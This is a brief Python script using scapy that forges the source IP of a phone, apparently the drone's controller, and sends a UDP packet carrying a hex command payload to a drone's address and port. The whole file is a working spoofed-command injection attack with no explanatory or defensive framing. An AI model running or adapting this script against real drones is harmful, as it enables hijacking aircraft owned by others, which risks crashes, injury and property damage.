import scapy.all as scapy

srcIP = '172.16.198.20' # my phone's IP
dstIP = '172.16.10.1' # drone's IP
srcPort = 8618 # source port
dstPort = 8895 # destination port

payload = "6680808080040499"

spoofed_packet = scapy.IP(src=srcIP, dst=dstIP) / scapy.UDP(sport=srcPort, dport=dstPort) / scapy.hex_bytes(payload)

scapy.send(spoofed_packet)